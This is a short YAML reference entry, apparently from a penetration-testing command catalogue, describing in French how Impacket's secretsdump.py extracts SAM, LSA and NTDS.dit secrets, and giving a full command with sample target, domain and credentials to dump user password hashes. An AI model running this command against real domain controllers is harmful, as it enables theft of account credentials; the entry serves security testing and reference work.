---
description: |
  Le fichier secretsdump.py d'Impacket exécute diverses techniques pour extraire les secrets de la machine distante sans exécuter d'agent. Les techniques incluent la lecture des secrets SAM et LSA à partir des registres, l'extraction des hachages NTLM, des informations d'identification en clair et des clés kerberos, ainsi que l'extraction du fichier NTDS.dit. La commande suivante tente d'utiliser le fichier NTDS.dit et le fichier système des machines spécifiées pour extraire les hachages des comptes d'utilisateurs associés à cette machine.

  Command Reference:

  	Target IP: 10.10.10.2

  	Domain Controller: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
items:
  - Password
  - Username
services:
  - Kerberos
  - NTLM
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
  - https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy
---
